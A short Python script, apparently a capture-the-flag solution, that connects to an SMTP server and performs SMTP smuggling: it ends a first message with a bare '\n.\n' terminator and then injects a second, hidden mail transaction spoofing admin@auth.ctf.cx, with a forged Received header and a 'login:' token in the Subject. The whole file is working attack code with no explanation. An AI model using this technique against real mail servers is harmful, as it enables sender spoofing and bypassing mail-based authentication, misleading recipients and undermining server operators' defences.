import socket

SERVER = "0.0.0.0"
MAIL_PORT = 25
WEB_PORT = 8025

def recv(s):
    data = s.recv(1024).decode()
    print(data, end="")
    return data

def send(s, msg):
    print("> " + msg.replace('\r', '\\r').replace('\n', '\\n'))
    s.send((msg).encode())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER, MAIL_PORT))
    recv(s)
    send(s, "HELO zeus\r\n")
    recv(s)
    send(s, "MAIL FROM:<admin@auth.ctf.cx>\r\n")
    recv(s)
    send(s, "RCPT TO:<magic@auth.ctf.cx>\r\n")
    recv(s)
    send(s, "DATA\r\n")
    recv(s)
    send(s, "Subject: test\r\n")
    send(s, "\r\n")
    send(s, "Hola!\n.\n")  
    send(s, "MAIL FROM:<admin@auth.ctf.cx>\r\n")
    send(s, "RCPT TO:<magic@auth.ctf.cx>\r\n")
    send(s, "DATA\r\n")
    send(s, f"Subject: login:f3ASlprYRRsH9FBTlXV3jw\r\nReceived: 1.3.3.7\r\n\r\nSmuggled!\r\n.\r\n")
    send(s, "QUIT\r\n")
    recv(s)